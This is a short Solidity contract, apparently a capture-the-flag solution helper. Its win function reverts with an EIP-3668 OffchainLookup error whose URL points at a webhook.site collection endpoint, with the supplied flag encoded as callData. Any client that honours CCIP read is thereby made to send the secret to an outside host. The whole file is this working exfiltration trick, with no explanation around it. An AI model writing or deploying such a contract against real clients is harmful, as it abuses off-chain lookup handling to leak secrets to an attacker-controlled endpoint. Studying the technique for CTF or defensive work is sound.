// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Helper {
    error OffchainLookup(address sender, string[] urls, bytes callData, bytes4 callbackFunction, bytes extraData);

    function win(string memory flag) external view {
        string[] memory urls = new string[](1);
        urls[0] = "https://webhook.site/62737f25-4a05-4e7b-a341-9329071159a6?sender={sender}&data={data}";
        revert OffchainLookup(address(this), urls, abi.encode(flag), Helper.dontcare.selector, "");
    }

    function dontcare() external pure {}
}
